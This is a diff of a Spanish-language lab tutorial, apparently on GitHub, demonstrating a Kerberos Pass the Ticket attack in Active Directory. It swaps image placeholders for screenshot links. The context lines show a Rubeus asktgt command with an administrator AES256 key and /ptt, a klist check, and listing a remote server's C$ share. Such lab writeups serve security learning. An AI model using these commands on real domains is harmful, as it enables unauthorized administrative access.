@@ -10,12 +10,12 @@ https://www.netwrix.com/pass_the_ticket.html
 Mediante Rubeus podemos realizar el ataque Pass the Ticket utilizando el siguiente comando:
 .\Rubeus.exe asktgt /user:Administrador/aes256:adbc3ed526ed66b5633a9eec27b4cccbc4d6a1903aedfd6923437af3da26a87b/domain:cs.org /dc:172.16.1.51 /ptt
 
-i1
+https://github.com/Karovil/Active-Directory/blob/Andr%C3%A9s-Arbel%C3%A1ez/ptt1.png
 
 Una vez obtenido el ticket, podemos verificar su validez con klist, que muestra los
 tickets activos de Kerberos en la memoria de la máquina:
 
-i2
+[i2](https://github.com/Karovil/Active-Directory/blob/Andr%C3%A9s-Arbel%C3%A1ez/ptt2.png)
 
 Finalmente, con el ticket de Kerberos, podemos realizar una prueba de acceso a
 recursos compartidos en la red. Usamos el siguiente comando para listar los contenidos
@@ -23,8 +23,7 @@ de la carpeta administrativa en un servidor remoto
 
 ls \\SERVER.cs.org\C$
 
-i3
-
+https://github.com/Karovil/Active-Directory/blob/Andr%C3%A9s-Arbel%C3%A1ez/ptt3.png
 
 Este comando nos permite acceder al recurso compartido C$ en el servidor
 SERVER.cs.org, utilizando el ticket Kerberos sin necesidad de autenticarnos con la
